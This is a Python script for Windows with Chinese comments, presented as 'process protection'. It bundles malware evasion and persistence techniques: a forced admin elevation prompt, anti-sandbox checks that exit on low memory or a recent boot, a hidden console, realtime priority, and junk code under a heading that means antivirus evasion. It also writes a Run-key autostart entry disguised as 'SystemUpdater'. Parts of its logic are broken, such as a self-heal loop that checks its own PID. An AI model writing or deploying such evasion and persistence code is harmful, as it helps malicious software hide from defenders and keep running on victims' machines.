
# pip install pywin32 psutil

import os
import sys
import time
import ctypes
import psutil
import winreg
import hashlib
import random
import subprocess
from threading import Thread

# 新增Windows API依赖
import win32con
import win32gui
import win32process

# ================= 保护配置 =================
PROTECTED_PROCESS = "target.exe"    # 要保护的进程名
SELF_HEAL_INTERVAL = 15            # 自愈检查间隔（秒）
OBFUSCATION_KEY = 0x7A             # 异或加密密钥

# ================= 核心保护功能 =================
class StringObfuscator:
    """ 字符串加密模块 """
    def __init__(self, key=OBFUSCATION_KEY):
        self.key = key
    
    def encrypt(self, s):
        return bytes([ord(c) ^ self.key for c in s]).decode('latin-1')
    
    def decrypt(self, s):
        return bytes([ord(c) ^ self.key for c in s]).decode('utf-8')

def hide_console_window():
    """ 隐藏控制台窗口 """
    try:
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except:
        pass

def require_admin():
    """ 强制提权运行 """
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{__file__}"', None, 1
        )
        sys.exit()

def anti_sandbox():
    """ 反沙箱检测 """
    try:
        # 检测内存和运行时间
        if (psutil.virtual_memory().total < 4*1024**3 or 
            time.time() - psutil.boot_time() < 300):
            sys.exit(0)
    except:
        pass

def process_stealth():
    """ 进程隐藏增强 """
    try:
        # 设置高优先级
        handle = win32process.GetCurrentProcess()
        win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
        
        # 隐藏控制台窗口
        hide_console_window()
    except:
        pass

def self_healing():
    """ 自愈守护线程 """
    while True:
        try:
            current_pid = os.getpid()
            if not psutil.pid_exists(current_pid):
                # 隐藏窗口启动参数
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                subprocess.Popen(
                    [sys.executable, PROTECTED_PROCESS],
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE
                )
                break
            time.sleep(SELF_HEAL_INTERVAL)
        except:
            pass

def init_protection():
    """ 初始化保护措施 """
    require_admin()
    anti_sandbox()
    process_stealth()
    Thread(target=self_healing, daemon=True).start()

# ================= 免杀增强 =================
def junk_code():
    """ 生成干扰代码 """
    [hashlib.md5(str(x).encode()).hexdigest() for x in range(random.randint(10,20))]

def fake_behavior():
    """ 伪装正常行为（静默模式） """
    try:
        # 模拟正常程序注册表操作
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except:
        pass

if __name__ == "__main__":
    init_protection()
    junk_code()
    fake_behavior()